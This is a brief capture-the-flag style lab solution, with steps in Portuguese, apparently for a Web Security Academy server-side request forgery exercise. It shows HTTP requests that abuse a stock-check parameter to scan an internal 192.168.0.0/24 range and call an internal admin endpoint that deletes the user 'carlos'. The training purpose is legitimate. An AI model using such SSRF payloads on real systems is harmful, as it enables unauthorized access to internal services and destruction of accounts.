Original request:

<pre>
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=<b>http://192.168.0.68/admin</b>
</pre>

1. Utilize o Intruder para fazer brute-force no escopo do IP apresentado. (192.168.0.0/24)
2. Encontre o host que tenha uma resposta **200**.
3. Delete a conta **carlos**.

Modified request:

<pre>
POST /product/stock HTTP/1.1
Host: ac651f621f1a3dbf80711543008b00f0.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://ac651f621f1a3dbf80711543008b00f0.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Origin: https://ac651f621f1a3dbf80711543008b00f0.web-security-academy.net
Content-Length: 63
Connection: close
Cookie: session=yFkvTJbphy0CMHlIcToEFFcRsLK4kFG7

stockApi=<b>http://192.168.0.245:8080/admin/delete?username=carlos</b>
</pre>
